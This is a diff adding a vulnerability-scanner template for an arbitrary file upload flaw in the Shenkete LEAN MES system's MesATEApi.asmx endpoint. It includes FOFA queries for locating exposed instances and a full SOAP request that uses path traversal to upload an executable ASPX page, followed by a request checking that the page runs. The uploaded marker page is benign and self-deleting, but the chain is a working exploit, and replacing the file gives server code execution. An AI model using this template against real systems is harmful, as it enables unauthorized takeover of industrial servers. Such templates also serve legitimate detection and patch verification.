@@ -1,0 +1,48 @@
+id: shen-ke-te-lean-mes-mesateapi-asmx-arbitrary-file-upload
+info:
+  name: 深科特 LEAN MES系统 MesATEApi.asmx 接口任意文件上传缺陷
+  author: 0dayPoc
+  severity: high
+  description: |-
+    fofa: title="LEAN MES - 用户登录" || body="Content/js/skt.utility.checkmobile.js" || body="../MobileApp/VerifyError.aspx" || body="Content/login/login2/multiplant_top.png"
+
+    深科特 LEAN MES 系统的 MesATEApi.asmx 接口存在任意文件上传漏洞，攻击者可利用该缺陷上传恶意文件，从而获取服务器权限。
+  tags: 深科特
+
+flow: http(1) && http(2)
+
+http:
+- raw:
+  - |
+    POST /WebService/MesATEApi.asmx HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: text/xml; charset=utf-8
+    SOAPAction: "http://mesateapi.com/UploadFileToMES"
+
+    <?xml version="1.0" encoding="utf-8"?>
+    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+      <soap:Body>
+        <UploadFileToMES xmlns="http://mesateapi.com/">
+          <empNo>string</empNo>
+          <sn>string</sn>
+          <resource>string</resource>
+          <station>string</station>
+          <fileBytes>PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiU+PCUgUmVzcG9uc2UuV3JpdGUoIk5kYXlUZXN0Iik7IFN5c3RlbS5JTy5GaWxlLkRlbGV0ZShTZXJ2ZXIuTWFwUGF0aChSZXF1ZXN0LlVybC5BYnNvbHV0ZVBhdGgpKTsgJT4=</fileBytes>
+          <folderName>/../ertyui</folderName>
+          <fileName>NTest.aspx</fileName>
+        </UploadFileToMES>
+      </soap:Body>
+    </soap:Envelope>
+- raw:
+  - |
+    GET /ertyui/NTest.aspx HTTP/1.1
+    Host: {{Hostname}}
+  matchers-condition: and
+  matchers:
+  - type: status
+    status:
+    - 200
+  - type: word
+    part: body
+    words:
+    - NdayTest
